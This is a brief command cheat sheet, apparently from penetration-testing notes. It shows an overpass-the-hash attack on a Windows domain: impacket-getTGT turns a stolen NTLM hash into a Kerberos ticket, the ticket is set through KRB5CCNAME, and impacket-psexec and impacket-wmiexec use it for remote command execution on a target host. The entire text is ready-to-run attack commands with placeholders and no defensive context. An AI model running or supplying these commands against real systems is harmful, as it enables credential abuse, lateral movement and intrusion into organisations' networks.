# Convert NTLM to Kerberos ticket
impacket-getTGT domain/user -hashes aad3b435b51404eeaad3b435b51404ee:NT_HASH

# Set ticket for use
export KRB5CCNAME=user.ccache

# Now use any Kerberos-enabled tool
impacket-psexec -k -no-pass domain/user@TARGET
impacket-wmiexec -k -no-pass domain/user@TARGET